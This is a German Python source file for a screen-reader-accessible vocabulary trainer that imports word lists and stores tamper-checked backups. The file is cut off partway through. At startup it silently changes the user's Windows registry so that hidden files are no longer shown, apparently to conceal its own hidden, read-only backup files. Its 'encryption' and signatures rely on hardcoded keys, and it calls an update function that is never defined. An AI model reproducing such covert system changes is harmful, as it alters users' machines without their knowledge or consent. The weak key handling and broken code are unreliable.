import wx
import random
import json
import os
import re
import zipfile
import xml.etree.ElementTree as ET
import ctypes
import atexit
import threading

_tolk_geladen = False
import sys
import uuid
import ctypes
import winreg

def disable_hidden_files():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
    except Exception as e:
        print("Fehler beim Deaktivieren der versteckten Dateien:", e)

disable_hidden_files()

try:
    from langdetect import detect
    SPRACHEN_MAP = {
        'en': 'Englisch', 'es': 'Spanisch', 'fr': 'Französisch', 
        'it': 'Italienisch', 'de': 'Deutsch', 'pt': 'Portugiesisch',
        'nl': 'Niederländisch', 'ru': 'Russisch', 'pl': 'Polnisch',
        'tr': 'Türkisch', 'el': 'Griechisch', 'sv': 'Schwedisch'
    }
except ImportError:
    detect = None
    SPRACHEN_MAP = {}

def erkenne_sprache(text):
    if not detect:
        return "Englisch"
    try:
        from langdetect import detect_langs
        import re
        nur_text = re.sub(r'[^a-zA-ZäöüÄÖÜßáéíóúñÁÉÍÓÚÑ]', ' ', text).strip()
        if len(nur_text) < 2:
            return "Englisch"
            
        langs = detect_langs(nur_text)
        lang_dict = {l.lang: l.prob for l in langs}
        
        best_lang = langs[0].lang
        # Wenn fälschlicherweise oft verwandte Sprachen bei kurzen Wörtern erkannt werden
        if best_lang in ['nl', 'af', 'no', 'da', 'sv']:
            if 'en' in lang_dict or 'de' in lang_dict:
                en_prob = lang_dict.get('en', 0)
                de_prob = lang_dict.get('de', 0)
                best_lang = 'en' if en_prob >= de_prob else 'de'
            else:
                # Standard-Fallback für englische/deutsche Vokabeltrainer
                best_lang = 'en'
                
        return SPRACHEN_MAP.get(best_lang, "Englisch")
    except Exception:
        return "Englisch"

try:
    if hasattr(sys, '_MEIPASS'):
        _tolk_pfad = os.path.join(sys._MEIPASS, "Tolk.dll")
    else:
        _tolk_pfad = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Tolk.dll")
    if os.path.exists(_tolk_pfad):
        _tolk = ctypes.windll.LoadLibrary(_tolk_pfad)
        
        # C-Signaturen definieren
        _tolk.Tolk_Load.argtypes = []
        _tolk.Tolk_Load.restype = None
        
        _tolk.Tolk_IsLoaded.argtypes = []
        _tolk.Tolk_IsLoaded.restype = ctypes.c_bool
        
        _tolk.Tolk_IsSpeaking.argtypes = []
        _tolk.Tolk_IsSpeaking.restype = ctypes.c_bool
        
        _tolk.Tolk_Speak.argtypes = [ctypes.c_wchar_p, ctypes.c_bool]
        _tolk.Tolk_Speak.restype = ctypes.c_bool
        
        _tolk.Tolk_Braille.argtypes = [ctypes.c_wchar_p]
        _tolk.Tolk_Braille.restype = ctypes.c_bool
        
        _tolk.Tolk_Unload.argtypes = []
        _tolk.Tolk_Unload.restype = None

        _tolk.Tolk_Load()
        _tolk_geladen = _tolk.Tolk_IsLoaded()
        
        @atexit.register
        def screenreader_beenden():
            if _tolk_geladen:
                try:
                    _tolk.Tolk_Unload()
                except Exception:
                    pass
except Exception as e:
    print("Fehler beim Laden von Tolk:", e)

def sprechen(text, interrupt=False):
    if _tolk_geladen:
        try:
            _tolk.Tolk_Speak(str(text), interrupt)
        except Exception:
            pass

def brailen(text):
    if _tolk_geladen:
        try:
            _tolk.Tolk_Braille(str(text))
        except Exception:
            pass

# ── Einstellungen ──────────────────────────────────────────────────────────────
JSON_DATEI   = "vokabeln.json"
HISTORIE_DATEI = "historie.json"
APP_VERSION = "1.0.0"

def lade_historie():
    import os, json
    if os.path.exists(HISTORIE_DATEI):
        try:
            with open(HISTORIE_DATEI, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []
    return []

def speichere_historie_eintrag(eintrag):
    import datetime, json
    historie = lade_historie()
    eintrag["zeit"] = datetime.datetime.now().isoformat()
    historie.append(eintrag)
    try:
        with open(HISTORIE_DATEI, "w", encoding="utf-8") as f:
            json.dump(historie, f, indent=4)
    except Exception:
        pass


    import threading
    threading.Thread(target=check_for_updates_background, daemon=True).start()

BUCHSTABIER_PAUSE_MS = 5000  # Verzögerung für das mit Leerzeichen buchstabierte Wort
TOLERANZ_AKTIV = True
LERN_MODUS = "alle"
LERN_DAUER_MIN = 30
BEST_BACKUP_STRATEGY = {}
BEST_SETTINGS_STRATEGY = {}

EINSTELLUNGEN_DATEI = "einstellungen.json"

import base64
import zlib
import itertools
import tempfile
import stat
import ctypes
import os

CHIFFRE_KEY = b"SuperGeheimerKey_42_VokabelTrainer_Schule"

def chiffriere(text):
    daten = text.encode("utf-8")
    xor_daten = bytes(a ^ b for a, b in zip(daten, itertools.cycle(CHIFFRE_KEY)))
    komprimiert = zlib.compress(xor_daten)
    return base64.b64encode(komprimiert)

def dechiffriere(b64_daten):
    komprimiert = base64.b64decode(b64_daten)
    xor_daten = zlib.decompress(komprimiert)
    daten = bytes(a ^ b for a, b in zip(xor_daten, itertools.cycle(CHIFFRE_KEY)))
    return daten.decode("utf-8")

def lade_einstellungen():
    global BUCHSTABIER_PAUSE_MS, TOLERANZ_AKTIV, LERN_MODUS, LERN_DAUER_MIN, BEST_BACKUP_STRATEGY, BEST_SETTINGS_STRATEGY, LERN_DAUER_MIN
    try:
        pfade = []
        if BEST_SETTINGS_STRATEGY and isinstance(BEST_SETTINGS_STRATEGY, dict) and "pfad" in BEST_SETTINGS_STRATEGY:
            pfade.append(BEST_SETTINGS_STRATEGY["pfad"])
            
        pfade.extend([
            EINSTELLUNGEN_DATEI,
            EINSTELLUNGEN_DATEI + ".bak",
            os.path.join(tempfile.gettempdir(), EINSTELLUNGEN_DATEI)
        ])
        
        pfade_clean = []
        for p in pfade:
            if p not in pfade_clean:
                pfade_clean.append(p)
                
        daten = {}
        for pfad in pfade_clean:
            if os.path.exists(pfad):
                try:
                    with open(pfad, "rb") as f:
                        raw_daten = f.read()
                    try:
                        json_str = dechiffriere(raw_daten)
                        daten = json.loads(json_str)
                    except Exception:
                        try:
                            daten = json.loads(raw_daten.decode("utf-8"))
                        except Exception:
                            daten = {}
                    break
                except Exception:
                    continue
                
        BUCHSTABIER_PAUSE_MS = daten.get("buchstabier_pause_ms", 5000)
        TOLERANZ_AKTIV = daten.get("toleranz_aktiv", True)
        LERN_MODUS = daten.get("lern_modus", "alle")
        LERN_DAUER_MIN = daten.get("lern_dauer_min", 30)
        BEST_BACKUP_STRATEGY = daten.get("best_backup_strategy", {})
        BEST_SETTINGS_STRATEGY = daten.get("best_settings_strategy", {})
    except Exception as e:
        print("Einstellungen konnten nicht geladen werden:", e)

def speichere_einstellungen():
    global BEST_SETTINGS_STRATEGY
    try:
        daten = {
            "buchstabier_pause_ms": BUCHSTABIER_PAUSE_MS,
            "toleranz_aktiv": TOLERANZ_AKTIV,
            "lern_modus": LERN_MODUS,
            "lern_dauer_min": LERN_DAUER_MIN,
            "best_backup_strategy": BEST_BACKUP_STRATEGY,
            "best_settings_strategy": BEST_SETTINGS_STRATEGY
        }
        json_str = json.dumps(daten, indent=4)
        verschluesselt = chiffriere(json_str)
        
        strategie_erfolgreich = False
        if BEST_SETTINGS_STRATEGY and isinstance(BEST_SETTINGS_STRATEGY, dict):
            pfad = BEST_SETTINGS_STRATEGY.get("pfad")
            if pfad:
                try:
                    if os.path.exists(pfad):
                        ctypes.windll.kernel32.SetFileAttributesW(pfad, 128)
                        os.chmod(pfad, stat.S_IWRITE)
                        
                    with open(pfad, "wb") as f_out:
                        f_out.write(verschluesselt)
                        
                    attrs = 128
                    if BEST_SETTINGS_STRATEGY.get("versteckt"): attrs |= 2
                    if BEST_SETTINGS_STRATEGY.get("schreibgeschuetzt"): attrs |= 1
                    
                    if ctypes.windll.kernel32.SetFileAttributesW(pfad, attrs) != 0:
                        strategie_erfolgreich = True
                except Exception:
                    pass
                    
        if not strategie_erfolgreich:
            pfade = [
                EINSTELLUNGEN_DATEI,
                EINSTELLUNGEN_DATEI + ".bak",
                os.path.join(tempfile.gettempdir(), EINSTELLUNGEN_DATEI)
            ]
            
            bester_score = -1
            beste_strategie = {}
            
            for pfad in pfade:
                score = 0
                if os.path.exists(pfad):
                    try:
                        ctypes.windll.kernel32.SetFileAttributesW(pfad, 128)
                        os.chmod(pfad, stat.S_IWRITE)
                    except Exception:
                        pass
                        
                try:
                    with open(pfad, "wb") as f_out:
                        f_out.write(verschluesselt)
                    score += 1
                    
                    versteckt = False
                    if ctypes.windll.kernel32.SetFileAttributesW(pfad, 2) != 0:
                        versteckt = True
                        score += 2
                        
                    schreibgeschuetzt = False
                    attr_test = 2 if versteckt else 128
                    attr_test |= 1
                    
                    if ctypes.windll.kernel32.SetFileAttributesW(pfad, attr_test) != 0:
                        ctypes.windll.kernel32.SetFileAttributesW(pfad, 128)
                        os.chmod(pfad, stat.S_IWRITE)
                        try:
                            with open(pfad, "ab") as f_test:
                                pass
                            schreibgeschuetzt = True
                            score += 3
                            ctypes.windll.kernel32.SetFileAttributesW(pfad, attr_test)
                        except Exception:
                            pass
                            
                    if score > bester_score:
                        bester_score = score
                        beste_strategie = {
                            "pfad": pfad,
                            "versteckt": versteckt,
                            "schreibgeschuetzt": schreibgeschuetzt,
                            "score": score
                        }
                except Exception:
                    continue
                    
            if beste_strategie:
                BEST_SETTINGS_STRATEGY = beste_strategie
                daten["best_settings_strategy"] = BEST_SETTINGS_STRATEGY
                json_str = json.dumps(daten, indent=4)
                verschluesselt = chiffriere(json_str)
                
                pfad = BEST_SETTINGS_STRATEGY["pfad"]
                ctypes.windll.kernel32.SetFileAttributesW(pfad, 128)
                os.chmod(pfad, stat.S_IWRITE)
                with open(pfad, "wb") as f_out:
                    f_out.write(verschluesselt)
                
                attrs = 128
                if BEST_SETTINGS_STRATEGY["versteckt"]: attrs |= 2
                if BEST_SETTINGS_STRATEGY["schreibgeschuetzt"]: attrs |= 1
                ctypes.windll.kernel32.SetFileAttributesW(pfad, attrs)
                
        # Aufräumen anderer Einstellungen-Backups
        if BEST_SETTINGS_STRATEGY and isinstance(BEST_SETTINGS_STRATEGY, dict):
            akt_pfad = BEST_SETTINGS_STRATEGY.get("pfad")
            if akt_pfad:
                alle_pfade = [
                    EINSTELLUNGEN_DATEI + ".bak",
                    os.path.join(tempfile.gettempdir(), EINSTELLUNGEN_DATEI)
                ]
                for p in alle_pfade:
                    if p != akt_pfad and os.path.exists(p):
                        try:
                            import ctypes, stat
                            ctypes.windll.kernel32.SetFileAttributesW(p, 128)
                            os.chmod(p, stat.S_IWRITE)
                            os.remove(p)
                        except Exception:
                            pass
    except Exception as e:
        print("Fehler beim Speichern der Einstellungen:", e)

# Lade Einstellungen direkt am Start
lade_einstellungen()
HINTERGRUND  = "#f5f5f5"
WEISS        = "#ffffff"
TEXTFARBE    = "#111111"
BLAU         = "#005fcc"
FEHLER_FARBE = "#8b0000"
ERFOLG_FARBE = "#0b5f24"
GRAU         = "#666666"

VERBOTENE_WOERTER = set()

vokabelliste = []

# ══════════════════════════════════════════════════════════════════════════════
# Duplikat- und Validierungsprüfung
# ══════════════════════════════════════════════════════════════════════════════

def ist_ungueltig(wort):
    return wort.strip().lower() in VERBOTENE_WOERTER

def ist_duplikat(en, de):
    en_l = en.strip().lower()
    de_l = de.strip().lower()
    return any(
        str(v.get("en","")).strip().lower() == en_l and
        str(v.get("de","")).strip().lower() == de_l
        for v in vokabelliste
    )

def duplikate_bereinigen():
    gesehen = set()
    sauber  = []
    for v in vokabelliste:
        k = (v.get("en","").strip().lower(), v.get("de","").strip().lower())
        if k not in gesehen:
            gesehen.add(k)
            sauber.append(v)
    return sauber

# ══════════════════════════════════════════════════════════════════════════════
# Datei
# ══════════════════════════════════════════════════════════════════════════════

import hashlib
import hmac

SECRET_KEY = b"GeheimerVokabelSchluessel123!"

def berechne_signatur(vokabeln_liste):
    daten_str = json.dumps(vokabeln_liste, ensure_ascii=False, sort_keys=True, separators=(',', ':'))
    return hmac.new(SECRET_KEY, daten_str.encode('utf-8'), hashlib.sha256).hexdigest()

def datei_laden():
    global vokabelliste
    if os.path.exists(JSON_DATEI):
        try:
            with open(JSON_DATEI, "r", encoding="utf-8") as f:
                daten = json.load(f)
            
            if isinstance(daten, dict):
                vokabelliste_kandidat = daten.get("vokabeln", [])
                gespeicherte_signatur = daten.get("signatur", "")
                
                if gespeicherte_signatur == berechne_signatur(vokabelliste_kandidat):
                    vokabelliste = vokabelliste_kandidat
                else:
                    backup_file = JSON_DATEI + ".bak"
                    backup_file2 = JSON_DATEI + ".bak2"
                    backup_temp = os.path.join(tempfile.gettempdir(), "vokabeln.json.bak")
                    
                    pfade = []
                    if BEST_BACKUP_STRATEGY and isinstance(BEST_BACKUP_STRATEGY, dict) and "pfad" in BEST_BACKUP_STRATEGY:
                        pfade.append(BEST_BACKUP_STRATEGY["pfad"])
                        
                    pfade.extend([backup_file, backup_file2, backup_temp])
                    
                    dec = None
                    # ... remove duplicates while preserving order
                    pfade_clean = []
                    for p in pfade:
                        if p not in pfade_clean:
                            pfade_clean.append(p)
                    
                    for pfad in pfade_clean:
                        if os.path.exists(pfad):
                            try:
                                import base64, zlib
                                with open(pfad, "rb") as f_bak:
                                    enc = f_bak.read()
                                try:
                                    json_str = dechiffriere(enc)
                                    dec = json_str.encode("utf-8")
                                except Exception:
                                    dec = zlib.decompress(base64.b64decode(enc))
                                break # Wir haben ein funktionierendes Backup gefunden
                            except Exception:
                                continue
                                
                    if dec is not None:
                        try:
                            if os.path.exists(JSON_DATEI):
                                import stat
                                try: os.chmod(JSON_DATEI, stat.S_IWRITE)
                                except Exception: pass
                                
                            with open(JSON_DATEI, "wb") as f_restore:
                                f_restore.write(dec)
                                
                            with open(JSON_DATEI, "r", encoding="utf-8") as f_re:
                                daten_bak = json.load(f_re)
                            vokabelliste = daten_bak.get("vokabeln", [])
                            wx.CallAfter(wx.MessageBox, "Manipulation erkannt! Das Original wurde aus dem Backup automatisch wiederhergestellt.", "Wiederhergestellt", wx.OK | wx.ICON_INFORMATION)
                        except Exception as e:
                            wx.CallAfter(wx.MessageBox, f"Fehler bei der Wiederherstellung: {e}", "Fehler", wx.OK | wx.ICON_ERROR)
                            vokabelliste = []
                    else:
                        wx.CallAfter(wx.MessageBox, "Die Datei vokabeln.json wurde manipuliert und es konnte kein Backup gefunden werden.", "Manipulation erkannt", wx.OK | wx.ICON_ERROR)
                        vokabelliste = []
            else:
                vokabelliste = []
        except Exception:
            # Versuche, ob es eine alte verschlüsselte Datei ist
            try:
                with open(JSON_DATEI, "rb") as f:
                    daten_raw = f.read()
                import base64, zlib
                dec = zlib.decompress(base64.b64decode(daten_raw))
                daten = json.loads(dec.decode("utf-8"))
                vokabelliste = daten.get("vokabeln", []) if isinstance(daten, dict) else daten
            except Exception:
                vokabelliste = []
    else:
        vokabelliste = []
    vorher = len(vokabelliste)
    vokabelliste = [
        v for v in duplikate_bereinigen()
        if not ist_ungueltig(v.get("en","")) and not ist_ungueltig(v.get("de",""))
    ]
    if len(vokabelliste) != vorher:
        datei_speichern()

def _datei_speichern_worker(aktuelle_liste):
    try:
        import stat
        import json
        import os
        import ctypes
        
        # Schreibschutz kurz entfernen
        if os.path.exists(JSON_DATEI):
            try:
                ctypes.windll.kernel32.SetFileAttributesW(JSON_DATEI, 128)
                os.chmod(JSON_DATEI, stat.S_IWRITE)
            except Exception:
                pass
                
        with open(JSON_DATEI, "w", encoding="utf-8") as f:
            signatur = berechne_signatur(aktuelle_liste)
            json.dump({"vokabeln": aktuelle_liste, "signatur": signatur}, f, ensure_ascii=False, indent=4)
            
        try:
            with open(JSON_DATEI, "r", encoding="utf-8") as f_src:
                daten_raw = f_src.read()
            enc = chiffriere(daten_raw)
            
            global BEST_BACKUP_STRATEGY
            strategie_erfolgreich = False
            
            # Versuche gemerkte Strategie
            if BEST_BACKUP_STRATEGY and isinstance(BEST_BACKUP_STRATEGY, dict):
                pfad = BEST_BACKUP_STRATEGY.get("pfad")
                if pfad:
                    try:
                        if os.path.exists(pfad):
                            ctypes.windll.kernel32.SetFileAttributesW(pfad, 128)
                            os.chmod(pfad, stat.S_IWRITE)
                            
                        with open(pfad, "wb") as f_bak:
                            f_bak.write(enc)
                            
                        attrs = 128
                        if BEST_BACKUP_STRATEGY.get("versteckt"): attrs |= 2
                        if BEST_BACKUP_STRATEGY.get("schreibgeschuetzt"): attrs |= 1
                        
                        if ctypes.windll.kernel32.SetFileAttributesW(pfad, attrs) != 0:
                            strategie_erfolgreich = True
                    except Exception:
                        pass
                        
            # Diagnose und Bewertung falls keine Strategie da oder fehlgeschlagen
            if not strategie_erfolgreich:
                pfade = [
                    JSON_DATEI + ".bak",
                    JSON_DATEI + ".bak2",
                    os.path.join(tempfile.gettempdir(), "vokabeln.json.bak")
                ]
                
                bester_score = -1
                beste_strategie = {}
                
                for pfad in pfade:
                    score = 0
                    if os.path.exists(pfad):
                        try:
                            ctypes.windll.kernel32.SetFileAttributesW(pfad, 128)
                            os.chmod(pfad, stat.S_IWRITE)
                        except Exception:
                            pass
                            
                    try:
                        with open(pfad, "wb") as f_bak:
                            f_bak.write(enc)
                        score += 1
                        
                        # Test Verstecken
                        versteckt = False
                        if ctypes.windll.kernel32.SetFileAttributesW(pfad, 2) != 0:
                            versteckt = True
                            score += 2
                            
                        # Test Schreibschutz + Selbstedition
                        schreibgeschuetzt = False
                        attr_test = 2 if versteckt else 128
                        attr_test |= 1 # READONLY
                        
                        if ctypes.windll.kernel32.SetFileAttributesW(pfad, attr_test) != 0:
                            ctypes.windll.kernel32.SetFileAttributesW(pfad, 128)
                            os.chmod(pfad, stat.S_IWRITE)
                            try:
                                with open(pfad, "ab") as f_test:
                                    pass
                                schreibgeschuetzt = True
                                score += 3
                                ctypes.windll.kernel32.SetFileAttributesW(pfad, attr_test)
                            except Exception:
                                pass
                                
                        if score > bester_score:
                            bester_score = score
                            beste_strategie = {
                                "pfad": pfad,
                                "versteckt": versteckt,
                                "schreibgeschuetzt": schreibgeschuetzt,
                                "score": score
                            }
                    except Exception:
                        continue
                        
                if beste_strategie:
                    BEST_BACKUP_STRATEGY = beste_strategie
                    
            # Aufräumen anderer Backup-Dateien
            if BEST_BACKUP_STRATEGY and isinstance(BEST_BACKUP_STRATEGY, dict):
                akt_pfad = BEST_BACKUP_STRATEGY.get("pfad")
                if akt_pfad:
                    import tempfile
                    alle_pfade = [
                        JSON_DATEI + ".bak",
                        JSON_DATEI + ".bak2",
                        os.path.join(tempfile.gettempdir(), "vokabeln.json.bak")
                    ]
                    for p in alle_pfade:
                        if p != akt_pfad and os.path.exists(p):
                            try:
                                import ctypes, stat
                                ctypes.windll.kernel32.SetFileAttributesW(p, 128)
                                os.chmod(p, stat.S_IWRITE)
                                os.remove(p)
                            except Exception:
                                pass
            speichere_einstellungen()

        except Exception:
            pass
            
        # Datei wieder auf Nur-Lesen setzen (Standard Schreibschutz)
        try:
            os.chmod(JSON_DATEI, stat.S_IREAD)
        except Exception:
            pass
    except Exception as e:
        print("Speicherfehler:", e)

def datei_speichern():
    import threading
    t = threading.Thread(target=_datei_speichern_worker, args=(list(vokabelliste),), daemon=True)
    t.start()

# ══════════════════════════════════════════════════════════════════════════════
# Word-Import
# ══════════════════════════════════════════════════════════════════════════════

_TRENNZEICHEN = re.compile(
    r'\s*[\-–—]\s+|\s+[\-–—]\s*'
)

HEADER_WOERTER = {"en", "englisch", "english", "de", "deutsch", "german", "spanisch", "spanish", "französisch", "french", "italienisch", "italian", "latein", "latin", "russisch", "russian", "niederländisch", "dutch", "schwedisch", "türkisch", "polnisch"}

def _ist_header_zeile(teile):
    return any(t.strip().lower() in HEADER_WOERTER for t in teile)


def _spaltenindizes(header_teile):
    lower = [str(s).strip().lower() for s in header_teile]
    de_i = next((i for i, n in enumerate(lower) if n in ("de", "deutsch", "german")), -1)
    
    if de_i != -1:
        en_i = next((i for i in range(len(lower)) if i != de_i), 0)
    else:
        en_i, de_i = 0, 1
        
    return en_i, de_i


def _zeile_zu_vokabel(teile, en_i=0, de_i=1, kategorie="vokabel"):
    if len(teile) > max(en_i, de_i):
        en = teile[en_i].strip()
        de = teile[de_i].strip()
        if en and de:
            return {"en": en, "de": de, "score_prozent": 0, "abfragen": 0, "id": str(uuid.uuid4()), "kategorie": kategorie}
    return None


def word_zellentext(zelle):
    teile = []
    for p in zelle.findall(".//{*}p"):
        txt = "".join(t.text or "" for t in p.findall(".//{*}t")).strip()
        if txt:
            teile.append(txt)
    return " ".join(teile).strip()


def _vokabeln_aus_tabellen(dok, kategorie="vokabel"):
    ergebnis = []
    for tbl in dok.findall(".//{*}tbl"):
        zeilen = []
        for row in tbl.findall("{*}tr"):
            z = [word_zellentext(c) for c in row.findall("{*}tc")]
            if any(w.strip() for w in z):
                zeilen.append(z)
        if not zeilen:
            continue

        if _ist_header_zeile(zeilen[0]):
            en_i, de_i = _spaltenindizes(zeilen[0])
            daten = zeilen[1:]
        else:
            en_i, de_i = 0, 1
            daten = zeilen

        for z in daten:
            v = _zeile_zu_vokabel(z, en_i, de_i, kategorie)
            if v:
                ergebnis.append(v)
    return ergebnis


def _absatz_text(absatz):
    return "".join(t.text or "" for t in absatz.findall(".//{*}t")).strip()


def _vokabeln_aus_absaetzen(dok, kategorie="vokabel"):
    ergebnis = []
    zeilen = []
    for p in dok.findall(".//{*}p"):
        txt = _absatz_text(p)
        if txt:
            zeilen.append(txt)

    if not zeilen:
        return []

    erste_teile = _TRENNZEICHEN.split(zeilen[0])
    if _ist_header_zeile(erste_teile) and len(erste_teile) >= 2:
        en_i, de_i = _spaltenindizes(erste_teile)
        daten_zeilen = zeilen[1:]
    else:
        en_i, de_i = 0, 1
        daten_zeilen = zeilen

    for zeile in daten_zeilen:
        teile = _TRENNZEICHEN.split(zeile)
        if len(teile) >= 2:
            v = _zeile_zu_vokabel(teile, en_i, de_i, kategorie)
            if v:
                ergebnis.append(v)
    return ergebnis


def vokabeln_aus_word_datei(pfad, kategorie="vokabel"):
    with zipfile.ZipFile(pfad) as archiv:
        if "word/document.xml" not in archiv.namelist():
            return []
        dok = ET.fromstring(archiv.read("word/document.xml"))

    ergebnis = _vokabeln_aus_tabellen(dok, kategorie)
    ergebnis += _vokabeln_aus_absaetzen(dok, kategorie)

    gesehen = set()
    eindeutig = []
    for v in ergebnis:
        key = (v["en"].strip().lower(), v["de"].strip().lower())
        if key not in gesehen:
            gesehen.add(key)
            eindeutig.append(v)
    return eindeutig

def vokabeln_aus_excel_datei(pfad, kategorie="vokabel"):
    try:
        import openpyxl
    except ImportError:
        return []
    
    ergebnis = []
    try:
        wb = openpyxl.load_workbook(pfad, data_only=True)
        for sheet in wb.sheetnames:
            ws = wb[sheet]
            is_first_row = True
            en_i, de_i = 0, 1
            for row in ws.iter_rows(values_only=True):
                if row:
                    row_str = [str(c or "").strip() for c in row]
                    if is_first_row and any(c for c in row_str):
                        if _ist_header_zeile(row_str):
                            en_i, de_i = _spaltenindizes(row_str)
                            is_first_row = False
                            continue
                        is_first_row = False
                    
                    if len(row_str) > max(en_i, de_i):
                        en = row_str[en_i]
                        de = row_str[de_i]
                        if en and de and en.lower() != "englisch" and de.lower() != "deutsch":
                            ergebnis.append({"en": en, "de": de, "score_prozent": 0, "abfragen": 0, "id": str(uuid.uuid4()), "kategorie": kategorie})
    except Exception as e:
        print("Excel import error:", e)
                    
    gesehen = set()
    eindeutig = []
    for v in ergebnis:
        key = (v["en"].lower(), v["de"].lower())
        if key not in gesehen:
            gesehen.add(key)
            eindeutig.append(v)
    return eindeutig

def vokabeln_aus_pdf_datei(pfad, kategorie="vokabel"):
    try:
        import PyPDF2
    except ImportError:
        return []
    
    ergebnis = []
    try:
        with open(pfad, "rb") as f:
            reader = PyPDF2.PdfReader(f)
            for page in reader.pages:
                text = page.extract_text()
                if text:
                    for line in text.splitlines():
                        if "-" in line:
                            teile = line.split("-", 1)
                            en = teile[0].strip()
                            de = teile[1].strip()
                            if en and de and not (en.lower() == "englisch" and de.lower() == "deutsch"):
                                ergebnis.append({"en": en, "de": de, "score_prozent": 0, "abfragen": 0, "id": str(uuid.uuid4()), "kategorie": kategorie})
    except Exception as e:
        print("PDF import error:", e)
                            
    gesehen = set()
    eindeutig = []
    for v in ergebnis:
        key = (v["en"].lower(), v["de"].lower())
        if key not in gesehen:
            gesehen.add(key)
            eindeutig.append(v)
    return eindeutig

def vokabeln_aus_text_datei(pfad, kategorie="vokabel"):
    ergebnis = []
    import csv
    try:
        with open(pfad, "r", encoding="utf-8", errors="replace") as f:
            if pfad.lower().endswith(".csv"):
                reader = csv.reader(f, delimiter=';')
                lines = list(reader)
                if not lines or len(lines[0]) < 2:
                    f.seek(0)
                    reader = csv.reader(f, delimiter=',')
                    lines = list(reader)
                
                en_i, de_i = 0, 1
                start_idx = 0
                if lines and _ist_header_zeile(lines[0]):
                    en_i, de_i = _spaltenindizes(lines[0])
                    start_idx = 1
                
                for row in lines[start_idx:]:
                    if row and len(row) > max(en_i, de_i):
                        en = row[en_i].strip()
                        de = row[de_i].strip()
                        if en and de and not (en.lower() == "englisch" and de.lower() == "deutsch"):
                            ergebnis.append({"en": en, "de": de, "score_prozent": 0, "abfragen": 0, "id": str(uuid.uuid4()), "kategorie": kategorie})
            else:
                for line in f:
                    if "-" in line:
                        teile = line.split("-", 1)
                        en = teile[0].strip()
                        de = teile[1].strip()
                        if en and de and not (en.lower() == "englisch" and de.lower() == "deutsch"):
                            ergebnis.append({"en": en, "de": de, "score_prozent": 0, "abfragen": 0, "id": str(uuid.uuid4()), "kategorie": kategorie})
    except Exception as e:
        print("TXT/CSV import error:", e)

    gesehen = set()
    eindeutig = []
    for v in ergebnis:
        key = (v["en"].lower(), v["de"].lower())
        if key not in gesehen:
            gesehen.add(key)
            eindeutig.append(v)
    return eindeutig

def datei_importieren_universal(pfad):
    ext = pfad.lower().split('.')[-1]
    name_lower = os.path.basename(pfad).lower()
    
    kategorie = "vokabel"
    if any(w in name_lower for w in ["fachwort", "fachwört", "fachwot", "fachwörter"]):
        kategorie = "fachwort"
        
    if ext == 'docx':
        return vokabeln_aus_word_datei(pfad, kategorie)
    elif ext == 'xlsx':
        return vokabeln_aus_excel_datei(pfad, kategorie)
    elif ext == 'pdf':
        return vokabeln_aus_pdf_datei(pfad, kategorie)
    elif ext in ['txt', 'csv']:
        return vokabeln_aus_text_datei(pfad, kategorie)
    else:
        return vokabeln_aus_text_datei(pfad, kategorie)

# ══════════════════════════════════════════════════════════════════════════════
# Gewichtete Vokabelwahl
# ══════════════════════════════════════════════════════════════════════════════

def waehle_vokabel():
    if not vokabelliste:
        return None
        
    gefilterte_liste = []
    for v in vokabelliste:
        kat = v.get("kategorie", "vokabel")
        if LERN_MODUS == "alle":
            gefilterte_liste.append(v)
        elif LERN_MODUS == "formel" and kat == "formel":
            gefilterte_liste.append(v)
        elif LERN_MODUS == "wort_bedeutung" and kat == "wort_bedeutung":
            gefilterte_liste.append(v)
        elif LERN_MODUS == "sprache" and kat in ["sprache", "vokabel"]: # Fallback für alte Einträge
            gefilterte_liste.append(v)
            
    if not gefilterte_liste:
        return None
        
    gewichte = []
    for v in gefilterte_liste:
        abfragen = v.get("abfragen", 0)
        score    = v.get("score_prozent", 0)
        gewichte.append(100.0 if abfragen == 0 else 100.0 / ((score / 10) + 1))
    return random.choices(gefilterte_liste, weights=gewichte, k=1)[0]

class VokabelVerwaltungDialog(wx.Dialog):
    def __init__(self, parent):
        super().__init__(parent, title="Vokabeln verwalten", size=(650, 700))
        self.SetBackgroundColour(HINTERGRUND)
        self.parent_frame = parent
        
        main_sizer = wx.BoxSizer(wx.VERTICAL)
        
        # --- 1. Liste ---
        lbl_info = wx.StaticText(self, label="Hier kannst du alle Vokabeln sehen und löschen.")
        lbl_info.SetFont(wx.Font(11, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        main_sizer.Add(lbl_info, 0, wx.ALL, 10)
        
        self.list_box = wx.CheckListBox(self)
        self.list_box.SetFont(wx.Font(12, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL))
        self.aktualisiere_liste()
        main_sizer.Add(self.list_box, 1, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)
        
        self.list_box.Bind(wx.EVT_KEY_DOWN, self.on_key_down)
        
        main_sizer.Add(wx.StaticLine(self), 0, wx.EXPAND | wx.ALL, 10)
        
        # --- 2. Hinzufügen ---
        lbl_neu = wx.StaticText(self, label="Neue Vokabel/Fachwort hinzufügen")
        lbl_neu.SetFont(wx.Font(11, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        main_sizer.Add(lbl_neu, 0, wx.LEFT | wx.RIGHT, 10)
        
        kat_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.rb_sprache = wx.RadioButton(self, label="Sprache", style=wx.RB_GROUP)
        self.rb_wort_bed = wx.RadioButton(self, label="Wort & Bedeutung")
        self.rb_formel = wx.RadioButton(self, label="Formel")
        kat_sizer.Add(self.rb_sprache, 0, wx.ALL, 5)
        kat_sizer.Add(self.rb_wort_bed, 0, wx.ALL, 5)
        kat_sizer.Add(self.rb_formel, 0, wx.ALL, 5)
        main_sizer.Add(kat_sizer, 0, wx.LEFT | wx.RIGHT, 5)
        
        hinzu_sizer = wx.BoxSizer(wx.HORIZONTAL)
        
        hinzu_sizer.Add(wx.StaticText(self, label="Fremdsprache:"), 0, wx.ALIGN_CENTER_VERTICAL | wx.ALL, 5)
        self.ent_neue_en = wx.TextCtrl(self, style=wx.TE_PROCESS_ENTER, name="Fremdsprachiges Wort eingeben")
